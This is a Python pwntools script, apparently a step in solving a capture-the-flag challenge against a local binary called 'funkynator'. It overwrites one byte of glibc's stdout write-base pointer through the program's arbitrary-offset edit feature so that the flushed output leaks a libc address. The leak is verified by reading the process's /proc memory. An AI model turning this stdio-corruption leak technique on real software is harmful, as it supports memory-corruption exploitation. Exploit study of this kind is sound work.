#!/usr/bin/env python3
"""Check if the flush data is in pwntools' buffer."""
from pwn import *
import struct, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))
r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

for _ in range(2):
    r.sendline(b'2')
    r.recvuntil(b'length')
    r.recvline()
    r.sendline(b'5')
    r.recvuntil(b'message:')
    r.sendline(b'A' * 5)
    r.recvuntil(b'?')
    r.sendline(b'n')
    r.recvuntil(b'?')
    r.sendline(b'y')
    r.recvuntil(b'location')
    r.recvline()
    r.recvuntil(b'> ')

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc_base + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
off = ((libc_base + STDOUT + WB_OFF + 1) - msg2) & 0xFFFFFFFFFFFFFFFF

log.info(f"byte1: {orig_byte1:#04x}->{new_byte1:#04x}")

r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'with what')
r.recvline()

# Send the byte value
r.send(bytes([new_byte1]) + b'\n')

# The program should have printed the editor menu and is now waiting for choice
# Let's try to send choice '1' to exit and see what we get back
log.info("Sending '1' to exit editor...")
r.sendline(b'1')

# Now receive everything - should be flush data + prompts
time.sleep(0.5)
data = r.recv(timeout=3)
log.info(f"Received {len(data)} bytes")

if data:
    log.info(f"Hex preview: {data[:100].hex()}")
    # Check for expected patterns
    new_wb = (orig_wb & 0xFFFFFFFFFFFF00FF) | (new_byte1 << 8)
    list_all_off = (libc_base + 0x1e84c0) - new_wb
    log.info(f"Expected _IO_list_all at offset {list_all_off:#x} in first {new_wb:#x}")
    log.info(f"new_wb={new_wb:#x}")
    log.info(f"libc + 0x1e8403 = {libc_base + 0x1e8403:#x}")
    log.info(f"Expected data start at {new_wb:#x}")
    
    if len(data) >= list_all_off + 8:
        leaked = struct.unpack('<Q', data[list_all_off:list_all_off+8])[0]
        log.info(f"Leaked value: {leaked:#x}")
        if abs((leaked & 0xFFFFFFFFFFFF) - (libc_base & 0xFFFFFFFFFFFF)) < 0x100000:
            computed = leaked - 0x1e84e0
            log.success(f"LIKELY LIBC LEAK: {computed:#x}")
        else:
            log.info("Not a libc address, more analysis needed")

r.close()
